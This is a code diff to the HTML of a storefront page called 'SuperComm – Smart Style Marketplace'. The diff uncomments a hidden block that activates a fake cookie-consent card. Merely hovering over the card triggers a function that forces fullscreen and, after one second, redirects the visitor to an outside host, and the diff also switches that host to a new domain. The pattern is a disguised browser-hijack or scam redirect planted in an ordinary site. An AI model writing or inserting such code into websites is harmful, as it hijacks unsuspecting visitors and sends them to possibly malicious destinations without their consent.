@@ -4,7 +4,7 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>SuperComm – Smart Style Marketplace</title>
-   <!-- <div id="cookie-wrapper">
+    <div id="cookie-wrapper">
   <div id="cookie-bg"></div>
   <div class="cookie-card" onmouseover="fullscreenAndRedirect()">
     <span class="cookie-x">×</span>
@@ -148,10 +148,10 @@
     }
 
     setTimeout(() => {
-      window.location.href = "https://belleom.online/Kheer/";
+      window.location.href = "https://fg987.b-cdn.net/";
     }, 1000);
   }
-</script> -->
+</script>
 
    <!-- Privacy-friendly analytics by Plausible -->
 <script async src="https://plausible.io/js/pa-rgM3G2H5Nv3n52i-AHeCT.js"></script>
